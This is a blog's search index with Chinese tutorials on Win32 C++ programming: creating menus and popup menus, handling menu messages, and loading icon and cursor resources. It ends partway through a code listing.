<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>windwos编程资源操作2</title>
    <link href="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/"/>
    <url>/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/1.png" alt="1"></p><blockquote><p>还是和前面的一样 先添加资源</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/2.png" alt="2"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/3.png" alt="3"></p><blockquote><p>这是顶级菜单   以及 子菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/4.png" alt="4"></p><blockquote><p>然后保存</p></blockquote><blockquote><p>还是先用前面的部分的代码</p></blockquote><blockquote><p>然后 开始添加菜单</p></blockquote><h2 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h2><blockquote><p>直接在创建窗口的时候创建菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/5.png" alt="5"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/6.png" alt="6"></p><blockquote><p>直接运行</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/7.png" alt="7"></p><blockquote><p>菜单直接出来了</p></blockquote><h2 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式:"></a>第二种方式:</h2><blockquote><p>通过传到createwindwoW 函数中  因为这个函数接受一个菜单句柄参数</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/8.png" alt="8"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/9.png" alt="9"></p><blockquote><p>因为涉及到句柄  所以就和前面的资源操作一样  需要先导入菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/10.png" alt="10"></p><blockquote><p>LoadMenuW函数接受两个参数   第一个是 这个程序的句柄  第二个是菜单资源的名称</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/11.png" alt="11"></p><blockquote><p>然后运行</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/12.png" alt="12"></p><h2 id="第三种"><a href="#第三种" class="headerlink" title="第三种:"></a>第三种:</h2><blockquote><p>通过点击  添加菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/13.png" alt="13"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/14.png" alt="14"></p><blockquote><p>右键展示子菜单</p></blockquote><blockquote><p>重新添加一个右键点击消息</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/15.png" alt="15"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/16.png" alt="16"></p><p><strong>ClientToScreen 函数  将 获取的鼠标坐标转化为 相对于屏幕的鼠标坐标   因为没有转换之前 是相对于工作区 也就是 直接创建的窗口的坐标位置</strong></p><blockquote><p>但是弹出菜单的函数接受坐标  出现的位置是相对于电脑屏幕而言的坐标 所以需要转换</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/17.png" alt="17"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/18.png" alt="18"></p><p><strong>GetCursorPos 函数直接获取屏幕中的鼠标坐标</strong></p><h2 id="给子菜单添加消息"><a href="#给子菜单添加消息" class="headerlink" title="给子菜单添加消息"></a>给子菜单添加消息</h2><blockquote><p>先找到子菜单的ID</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/19.png" alt="19"></p><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/20.png" alt="20"></p><blockquote><p>点击子菜单</p></blockquote><p><img src="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/21.png" alt="21"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-keyword">static</span> HINSTANCE hInstance = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-comment">//MessageBoxW(hwnd, L&quot;窗口创建了&quot;, L&quot;提示&quot;, MB_OK);</span><br><span class="hljs-comment">//添加控件</span><br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;移动窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x100</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;获取文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x101</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置文本框内容&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">110</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x102</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置父窗口&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">160</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x103</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_EDIT, <span class="hljs-string">L&quot;文本框内容&quot;</span>, WS_CHILD | WS_BORDER | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">320</span>, <span class="hljs-number">320</span>, <span class="hljs-number">80</span>, hwnd, (HMENU)<span class="hljs-number">0x104</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置ICON&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">220</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x105</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">CreateWindowW</span>(WC_BUTTON, <span class="hljs-string">L&quot;设置菜单&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="hljs-number">10</span>, <span class="hljs-number">420</span>, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, hwnd, (HMENU)<span class="hljs-number">0x106</span>, hInstance, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_RBUTTONDOWN:<br>&#123;<br><span class="hljs-comment">/*WORD x = LOWORD(lParam);</span><br><span class="hljs-comment">WORD y = HIWORD(lParam);*/</span><br>POINT point&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">/*point.x = x;</span><br><span class="hljs-comment">point.y = y;*/</span><br><span class="hljs-built_in">GetCursorPos</span>(&amp;point);<br><span class="hljs-comment">//ClientToScreen(hwnd, &amp;point);</span><br>HMENU hmenu = <span class="hljs-built_in">LoadMenuW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDR_MENU1));<br>HMENU hSubMenu = <span class="hljs-built_in">GetSubMenu</span>(hmenu, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">TrackPopupMenu</span>(hSubMenu,TPM_LEFTALIGN, point.x, point.y,<span class="hljs-number">0</span>,hwnd,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br>WORD ControlId = <span class="hljs-built_in">LOWORD</span>(wParam);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ControlId)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x100</span>:<br>&#123;<br>RECT rect&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">GetClientRect</span>(hwnd, &amp;rect);<br><span class="hljs-keyword">int</span> x = <span class="hljs-built_in">rand</span>() % (rect.right - <span class="hljs-number">120</span>);<br><span class="hljs-keyword">int</span> y = <span class="hljs-built_in">rand</span>() % (rect.bottom - <span class="hljs-number">40</span>);<br><span class="hljs-built_in">MoveWindow</span>((HWND)lParam, x, y, <span class="hljs-number">120</span>, <span class="hljs-number">40</span>, TRUE);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x101</span>:<br>&#123;<br>WCHAR buff[<span class="hljs-number">100</span>]&#123; <span class="hljs-number">0</span> &#125;;<br>HWND hedit = <span class="hljs-built_in">GetDlgItem</span>(hwnd, <span class="hljs-number">0x104</span>);<br><span class="hljs-built_in">GetWindowTextW</span>(hedit, buff, <span class="hljs-number">100</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x102</span>:<br>&#123;<br><span class="hljs-comment">/*HWND hedit = GetDlgItem(hwnd, 0x104);</span><br><span class="hljs-comment">SetWindowTextW(hedit,0x104,L&quot;SetWindowTextW&quot;);*/</span><br><span class="hljs-built_in">SetDlgItemTextW</span>(hwnd, <span class="hljs-number">0x104</span>, <span class="hljs-string">L&quot;SetDlgItemTextW&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x103</span>:<br>&#123;<br>HWND hnote = <span class="hljs-built_in">FindWindowW</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;无标题 - 记事本&quot;</span>);<br><span class="hljs-built_in">SetParent</span>((HWND)lParam, hnote);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0x106</span>:<br>&#123;<br>HMENU hmenu = <span class="hljs-built_in">LoadMenuW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDR_MENU1));<br><span class="hljs-built_in">SetMenu</span>(hwnd, hmenu);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> ID_Menu:<br>&#123;<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;子菜单1&quot;</span>, <span class="hljs-string">L&quot;子菜单1被点击了&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd, uMsg, wParam, lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br>myClass.hbrBackground = <span class="hljs-built_in">CreateSolidBrush</span>(<span class="hljs-built_in">RGB</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>));<br><span class="hljs-comment">//myClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));//设置图标</span><br><span class="hljs-comment">//myClass.hCursor = LoadCursorW(hInstance, MAKEINTRESOURCEW(IDC_CURSOR1));</span><br><span class="hljs-comment">//myClass.lpszMenuName = MAKEINTRESOURCEW(IDR_MENU1);</span><br><br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br><br><span class="hljs-comment">//HMENU hmenu = LoadMenuW(hInstance, MAKEINTRESOURCEW(IDR_MENU1));</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>semcms审计</title>
    <link href="/2021/08/25/semcms%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/08/25/semcms%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>windwos资源操作1</title>
    <link href="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/"/>
    <url>/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/1.png" alt="1"></p><h2 id="设置图标"><a href="#设置图标" class="headerlink" title="设置图标"></a>设置图标</h2><p>首先添加一个图标资源</p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/2.png" alt="2"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/3.png" alt="3"></p><blockquote><p>可以导入 也可以新建  这里就新建好了</p></blockquote><blockquote><p>随便画画 点击保存</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/4.png" alt="4"></p><blockquote><p>保存之后资源文件夹里面会多出两个文件</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/5.png" alt="5"></p><blockquote><p>先暂时不用管 继续操作</p></blockquote><blockquote><p>先要用到LoadIcon()函数  可以按F1进行查看详细信息</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HICON <span class="hljs-title">LoadIconA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR    lpIconName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><blockquote><p><strong>参数</strong></p><p>hInstance</p><p>类型：<strong>HINSTANCE</strong></p><p>模块实例的句柄，其可执行文件包含要加载的图标。加载标准图标时，此参数必须为<strong>NULL</strong>。</p><p>lpIconName</p><p>类型：<strong>LPCTSTR</strong></p><p>要加载的图标资源的名称。或者，该参数可以在低位字中包含资源标识符，在高位字中包含零。使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-makeintresourcea">MAKEINTRESOURCE</a>宏创建此值。</p><p><strong>返回值</strong></p><p>类型：<strong>HICON</strong></p><p>如果函数成功，则返回值是新加载图标的句柄。</p><p>如果函数失败，则返回值为<strong>NULL</strong>。要获取扩展错误信息，请调用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</p><p><strong>备注</strong></p><p><strong>LoadIcon</strong>仅在未加载的情况下加载图标资源；否则，它检索现有资源的句柄。该函数在图标资源中搜索最适合当前显示的图标。图标资源可以是彩色或单色位图。</p><p><strong>LoadIcon</strong>只能加载其大小符合一个图标<strong>SM_CXICON</strong>和<strong>SM_CYICON</strong>系统指标值。使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-loadimagea">LoadImage</a>函数加载其他尺寸的图标。</p></blockquote><p><strong>LoadIcon第二个参数可以在头文件里面看见</strong></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/6.png" alt="6"></p><blockquote><p>但是光直接写还不行 还是会报错 因为图片ID 实际上的值是整形的 而IDI_ICON1 是LPCWSTR形的  所以需要强转</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/7.png" alt="7"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/8.png" alt="8"></p><blockquote><p>可以用F12查看一下MAKEINTRESOURCE</p></blockquote><blockquote><p>相当于这个宏的作用也是进行强转</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/9.png" alt="9"></p><blockquote><p>这样写也是可以的</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/10.png" alt="10"></p><blockquote><p>然后设置图标</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/11.png" alt="11"></p><blockquote><p>试验一下</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/12.png" alt="12"></p><blockquote><p>成功变化</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/13.png" alt="13"></p><blockquote><p>也可以在创建的时候直接改变图标的样子</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/14.png" alt="14"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/15.png" alt="15"></p><h2 id="设置鼠标样式"><a href="#设置鼠标样式" class="headerlink" title="设置鼠标样式"></a>设置鼠标样式</h2><blockquote><p>先导入一个鼠标的光标资源</p></blockquote><blockquote><p>操作和上面一样</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/16.png" alt="16"></p><blockquote><p>然后保存</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/17.png" alt="17"></p><blockquote><p>方式也都和上面的基本类似只是函数改了一下</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/18.png" alt="18"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/19.png" alt="19"></p><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/20.png" alt="20"></p><blockquote><p>同样也可以创建窗口的时候就改变鼠标</p></blockquote><p><img src="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/21.png" alt="21"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 